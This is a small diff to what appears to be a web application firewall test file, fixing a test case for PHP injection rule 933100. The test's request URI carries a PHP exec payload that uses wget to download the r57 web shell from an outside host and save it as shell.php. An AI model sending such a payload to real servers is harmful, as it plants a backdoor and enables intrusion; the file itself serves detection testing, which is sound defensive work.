@@ -25,7 +25,7 @@
           method: GET
           port: 80
           uri: /?foo=<?exec('wget%20http://r57.biz/r57.txt%20-O
-          version: shell.php');?> HTTP/1.0
+          version: HTTP/1.0
         output:
           log_contains: id "933100"
   - 
